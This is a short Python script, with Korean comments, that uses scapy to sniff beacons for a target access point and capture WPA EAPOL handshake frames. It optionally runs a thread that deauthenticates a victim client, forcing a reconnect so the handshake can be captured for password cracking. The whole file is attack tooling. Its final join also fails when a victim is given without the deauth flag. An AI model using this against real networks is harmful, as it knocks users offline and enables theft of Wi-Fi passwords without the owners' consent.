import threading
from scapy.all import sniff
from cls_collPkt import collPkt
    

def collEapol(bssAddr:str, vicAddr='', deauthFlag=False):
    collCls = collPkt()
    collCls.bssid = bssAddr
    
    if ((vicAddr != '') and (deauthFlag==True)):
        thread = threading.Thread(target=collCls.deauthThread, args=(vicAddr, bssAddr))
        thread.start()
        # Deauth Thread 생성
    
    sniff(prn=collCls.beaconCapture, stop_filter=collCls.beaconStop)
    # BEACON 핸들러 실행
    sniff(prn=collCls.eapolCapture, filter='ether proto 0x888e', stop_filter=collCls.eapolStop)
    # EAPOL 핸들러 실행

    if vicAddr != '':
        thread.join()
        # Deauth Thread 대기
